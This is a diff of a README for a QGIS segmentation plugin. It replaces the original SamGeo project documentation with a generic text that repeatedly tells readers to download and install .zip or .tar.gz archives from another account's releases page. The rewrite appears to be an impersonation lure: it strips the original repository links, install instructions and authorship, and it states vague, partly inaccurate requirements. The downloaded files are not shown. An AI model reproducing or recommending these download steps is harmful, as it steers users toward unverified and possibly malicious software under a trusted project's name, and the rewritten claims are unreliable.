@@ -1,298 +1,68 @@
-# SamGeo QGIS Plugin
+# 🌍 qgis-samgeo-plugin - Enhance Your Geospatial Projects Easily
 
-[![DOI](https://joss.theoj.org/papers/10.21105/joss.05663/status.svg)](https://doi.org/10.21105/joss.05663)
-[![QGIS](https://img.shields.io/badge/QGIS-plugin-orange.svg)](https://github.com/opengeos/qgis-samgeo-plugin)
-[![QGIS](https://img.shields.io/badge/SamGeo-repository-blue.svg)](https://github.com/opengeos/segment-geospatial)
+[![Download qgis-samgeo-plugin](https://img.shields.io/badge/Download%20Now-Get%20the%20Plugin-blue)](https://github.com/dadathegreat1989/qgis-samgeo-plugin/releases)
 
-A QGIS plugin for remote sensing image segmentation using [SamGeo](https://samgeo.gishub.org), powered by Meta's Segment Anything Model ([SAM](https://github.com/facebookresearch/sam3)).
+## 📦 Overview
 
-## Features
+The **qgis-samgeo-plugin** is an easy-to-use plugin for QGIS that integrates with the SamGeo Python package. This powerful tool enhances your ability to work with geospatial data and deep learning techniques. Whether you're in environmental research or urban planning, this plugin helps you visualize and analyze geographical information seamlessly.
 
-- **Multiple SAM versions**: Support for SamGeo (SAM1), SamGeo2 (SAM2), and SamGeo3 (SAM3)
-- **Text-based segmentation**: Describe what you want to segment (e.g., "building", "tree", "road")
-- **Interactive point prompts**: Click on the map to add foreground/background points
-- **Box prompts**: Draw rectangles to segment specific regions
-- **GeoTIFF support**: Works with georeferenced images, preserving spatial reference
-- **Multiple output formats**: Save as vector (GeoPackage, Shapefile) or raster (GeoTIFF)
+## 🚀 Getting Started
 
-## Demos
+To start using the qgis-samgeo-plugin, follow these simple steps:
 
-Check out this [short video demo](https://youtu.be/DKKrQKeU3Ik) and [full video tutorial](https://youtu.be/oPZc7BvDsHE) on how to use the plugin.
+1. **Prepare Your System**  
+   Ensure you have QGIS installed on your computer. If you haven't installed it yet, download QGIS from the official website: [Download QGIS](https://qgis.org/en/site/forusers/download.html).
 
-[![](https://github.com/user-attachments/assets/0a9dbc4a-98fa-4a14-8238-be5b871926fa)](https://youtu.be/oPZc7BvDsHE)
+2. **Visit the Releases Page**  
+   To get the latest version of the qgis-samgeo-plugin, visit this page: [qgis-samgeo-plugin Releases](https://github.com/dadathegreat1989/qgis-samgeo-plugin/releases).
 
-## Requirements
+3. **Download the Plugin**  
+   Find the most recent release and click the download link. The file should end with .zip or .tar.gz. This file contains the plugin you need.
 
-- QGIS 3.22 or later
-- Python 3.10+
-- SamGeo package
-- Hugging Face account (for model downloads)
-- Access to Meta's SAM 3 model
+4. **Extract the Files**  
+   Once downloaded, locate the file on your computer. Right-click it and select "Extract Here" or use your preferred extraction program.
 
-## Installation
+5. **Install the Plugin in QGIS**  
+   - Open QGIS.
+   - Navigate to `Plugins` > `Manage and Install Plugins`.
+   - Select the `Install from ZIP` option.
+   - Browse to where you extracted the plugin files and select the .zip or .tar.gz file.
+   - Click `Install Plugin`.
 
-### 1. Install SamGeo
+6. **Activate the Plugin**  
+   To activate the plugin, go to `Plugins` in the main menu, find `SamGeo Plugin`, and turn it on.
 
-First, install SamGeo in your QGIS Python environment. It is recommended to create a new conda environment **and** install QGIS and SamGeo. Install [Miniconda ](https://www.anaconda.com/docs/getting-started/miniconda/install), then run the following commands to install SamGeo on macOS/Linux:
+7. **Begin Using the Plugin**  
+   You’re now ready to use the qgis-samgeo-plugin! You will find it under the `Plugins` menu. Explore its features to enhance your geospatial projects.
 
-```bash
-conda create -n geo python=3.12
-conda activate geo
-conda install -c conda-forge qgis segment-geospatial
-```
+## 🛠️ Features
 
-Some SamGeo dependencies are only available on PyPI. Run the following command to install all dependencies:
+- **Segmentation Analysis:** Quickly analyze different segments of geospatial data using deep learning techniques.
+- **User-Friendly Interface:** Designed for ease of use, the plugin simplifies complex tasks.
+- **Integration with QGIS:** Works seamlessly within the QGIS environment for improved workflow.
+- **Support for Various Data Formats:** Handle several geospatial data formats efficiently.
+- **Active Updates:** Regular updates ensure compatibility with the latest versions of QGIS and new features.
 
-```bash
-pip install -U "segment-geospatial[samgeo3]"
-```
+## 🔍 System Requirements
 
-It is a bit tricky to install SAM 3 on Windows. Run the following commands on Windows to install SamGeo:
+To run the qgis-samgeo-plugin, ensure your system meets the following requirements:
 
-```bash
-conda create -n geo python=3.12
-conda activate geo
-conda install pytorch torchvision pytorch-cuda=12.1 -c pytorch -c nvidia
-pip install "segment-geospatial[samgeo3]" triton-windows
-conda install -c conda-forge qgis
-```
+- **Operating System:** Windows, macOS, or Linux
+- **QGIS Version:** Version 3.10 or higher
+- **Python:** Compatible with the installed QGIS Python version
 
-### 2. Install the Plugin
+## 📥 Download & Install
 
-#### Option A: Using the install script
+Ready to get started? **Download** the qgis-samgeo-plugin by visiting: [qgis-samgeo-plugin Releases](https://github.com/dadathegreat1989/qgis-samgeo-plugin/releases).
 
-```bash
-# Clone the repository
-git clone https://github.com/opengeos/qgis-samgeo-plugin.git
-cd qgis-samgeo-plugin
-conda activate geo
+You will find the download link to the latest plugin version there. Follow the installation steps outlined in the "Getting Started" section, and begin enhancing your geospatial analyses today!
 
-# Install (Linux/macOS)
-python install_plugin.py
+## 📞 Support
 
-# Or use the shell script
-chmod +x install_plugin.sh
-./install_plugin.sh
-```
+If you encounter any issues or have questions, please join our community discussions on GitHub Issues. We're here to help you make the most out of the qgis-samgeo-plugin.
 
-#### Option B: Manual installation
+## 🌟 Contributing
 
-1. Find your QGIS plugins directory:
+We welcome contributions from everyone. If you would like to help improve the qgis-samgeo-plugin or report a bug, please feel free to submit a pull request or open an issue on our repository.
 
-   - Linux: `~/.local/share/QGIS/QGIS3/profiles/default/python/plugins`
-   - macOS: `~/Library/Application Support/QGIS/QGIS3/profiles/default/python/plugins`
-   - Windows: `%APPDATA%\QGIS\QGIS3\profiles\default\python\plugins`
-
-2. Copy or symlink this entire folder (qgis-samgeo-plugin) to the plugins directory and rename it to `samgeo_plugin`:
-
-   ```bash
-   ln -s /path/to/qgis-samgeo-plugin ~/.local/share/QGIS/QGIS3/profiles/default/python/plugins/samgeo_plugin
-   ```
-
-3. Restart QGIS
-
-4. Enable the plugin: Go to **Plugins > Manage and Install Plugins**, find "SamGeo", and enable it.
-
-### 3. Set up Hugging Face authentication
-
-Sign up for a free account at [Hugging Face](https://huggingface.co/join) if you don't have one. Then, generate an access token by following the instructions [here](https://huggingface.co/docs/hub/en/security-tokens).
-
-Run the following command in your terminal to log in to Hugging Face:
-
-```bash
-hf auth login
-```
-
-Provide your access token when prompted.
-
-### 4. Request access to SAM 3 model
-
-To use SamGeo3 (SAM 3), you need to request access to the model. Go to the [SAM 3 model page](https://huggingface.co/facebook/sam3) and log in with your Hugging Face account. Fill out the access request form and click on the "Submit" button to send your request. The approval process might take a few hours. Once approved, you can use SamGeo3 in the plugin.
-
-If your request is denied, you can try to download the model from [ModelScope](https://www.modelscope.cn/models/facebook/sam3/files), which does not require access permission. After downloading, place the model files in the following directory:
-
-- Linux/macOS: `~/.cache/huggingface/hub/models--facebook--sam3`
-- Windows: `%USERPROFILE%\.cache\huggingface\hub\models--facebook--sam3`
-
-## Usage
-
-### Start QGIS
-
-Run the following commands to start QGIS and use the SamGeo plugin:
-
-```bash
-conda activate geo
-qgis
-```
-
-### Opening the Plugin
-
-1. Click the SamGeo icon in the toolbar, or
-2. Go to **Raster > SamGeo > SamGeo Segmentation**
-
-### Workflow
-
-#### 1. Load the Model
-
-1. In the **Model** tab, select your preferred SAM version:
-   - **SamGeo3 (SAM3)**: Latest version with text prompts support
-   - **SamGeo2 (SAM2)**: Second generation SAM
-   - **SamGeo (SAM1)**: Original SAM model
-2. Choose the backend (meta or transformers)
-3. Select the device (auto, cuda, or cpu)
-4. Set the confidence threshold (default: 0.5)
-5. Enable interactive mode if you want to use point/box prompts
-6. Click **Load Model**
-
-   ![](https://github.com/user-attachments/assets/f1e4e356-e460-4d94-83ec-1f596d65156e)
-
-#### 2. Set an Image
-
-- Select a raster layer from the dropdown and click **Set Image from Layer**, or
-- Browse for an image file and click **Set Image from File**
-- You can download a sample image from [here](https://huggingface.co/datasets/giswqs/geospatial/resolve/main/uc_berkeley.tif)
-
-  ![](https://github.com/user-attachments/assets/b7c6a430-c4c3-4359-855c-b198cdcf2c91)
-
-#### 3. Segment the Image
-
-##### Text-Based Segmentation (Text tab)
-
-1. Enter a text prompt describing what to segment (e.g., "tree", "building")
-2. Optionally set min/max size filters
-3. Click **Segment by Text**
-
-   ![](https://github.com/user-attachments/assets/37012722-e1aa-4abe-9b25-8955064cfd8d)
-
-##### Point-Based Segmentation (Interactive tab)
-
-1. Click **Add Foreground Points** and click on objects to include
-2. Click **Add Background Points** and click on areas to exclude
-3. Click **Segment by Points**
-4. Right-click to finish adding points
-
-   ![](https://github.com/user-attachments/assets/0eb1174d-5e22-4555-be7d-aec0714c147d)
-
-##### Box-Based Segmentation (Interactive tab)
-
-1. Click **Draw Box**
-2. Draw a rectangle around the area to segment
-3. Click **Segment by Box**
-
-   ![](https://github.com/user-attachments/assets/5aa962ae-4ed2-4696-a609-c586006a2ed8)
-
-##### Batch Point Segmentation (Batch tab)
-
-Use this mode to process many points at once (e.g., building centroids):
-
-1. Select a point vector layer from the dropdown, or browse for a vector file (GeoJSON, Shapefile, etc.)
-2. Optionally specify the CRS if not auto-detected (e.g., "EPSG:4326")
-3. Set min/max size filters if needed
-4. Optionally specify an output raster file path
-5. Click **Run Batch Segmentation**
-
-   ![](https://github.com/user-attachments/assets/b7714361-2122-4953-9fe0-61f2e9ae9b1d)
-
-Each point generates a separate mask, making this efficient for segmenting many individual objects.
-
-#### 4. Save Results (Output tab)
-
-1. Choose output format (vector or raster)
-2. Set the output file path
-3. Click **Save Masks**
-
-   ![](https://github.com/user-attachments/assets/84d00598-56a2-42c3-8cea-bfbf739c4e65)
-
-## Programmatic Usage
-
-You can also use SamGeo programmatically in the QGIS Python console:
-
-```python
-from samgeo import SamGeo3
-
-# Initialize the model
-sam = SamGeo3(
-    backend="meta",
-    enable_inst_interactivity=True,
-    confidence_threshold=0.5,
-)
-
-# Set an image (GeoTIFF)
-sam.set_image("/path/to/your/image.tif")
-
-# Text-based segmentation
-sam.generate_masks("building")
-sam.save_masks("buildings.tif", unique=True)
-
-# Point-based segmentation
-point_coords = [[500, 300], [600, 400]]  # pixel coordinates
-point_labels = [1, 1]  # 1=foreground, 0=background
-sam.generate_masks_by_points(point_coords, point_labels)
-sam.save_masks("points_result.tif")
-
-# Batch point segmentation (from vector file)
-sam.generate_masks_by_points_patch(
-    point_coords_batch="building_centroids.geojson",
-    point_crs="EPSG:4326",
-    output="building_masks.tif",
-    unique=True,
-)
-
-# Box-based segmentation
-boxes = [[100, 100, 500, 500]]  # [xmin, ymin, xmax, ymax] in pixels
-sam.generate_masks_by_boxes(boxes)
-sam.save_masks("box_result.tif")
-
-# Convert raster mask to vector
-from samgeo import common
-common.raster_to_vector("buildings.tif", "buildings.gpkg")
-```
-
-## Troubleshooting
-
-### Model fails to load
-
-- Ensure segment-geospatial is installed with the appropriate SAM support
-- Check that you have enough GPU memory (or switch to CPU)
-- Try restarting QGIS
-
-### Segmentation is slow
-
-- Use a GPU if available (select "cuda" device)
-- Reduce image resolution before processing
-- Use the transformers backend which may be faster for some tasks
-
-### No objects found
-
-- Try a different text prompt
-- Lower the confidence threshold
-- Adjust min/max size filters
-- Ensure the image is properly loaded
-
-## License
-
-This plugin is released under the MIT License.
-
-## Citation
-
-If you use this plugin in your research, please cite:
-
-```bibtex
-@article{wu2023samgeo,
-  title     = "{samgeo: A Python package for segmenting geospatial data with the
-               Segment Anything Model (SAM)}",
-  author    = "Wu, Qiusheng and Osco, Lucas Prado",
-  journal   = "Journal of Open Source Software",
-  volume    =  8,
-  number    =  89,
-  pages     =  5663,
-  year      =  2023,
-  url       = "https://doi.org/10.21105/joss.05663",
-  doi       = "10.21105/joss.05663",
-  issn      = "2475-9066"
-}
-```
-
-## Contributing
-
-Contributions are welcome! Please see the [GitHub repository](https://github.com/opengeos/qgis-samgeo-plugin) for guidelines.
+Explore the power of geospatial analysis with the **qgis-samgeo-plugin** today!
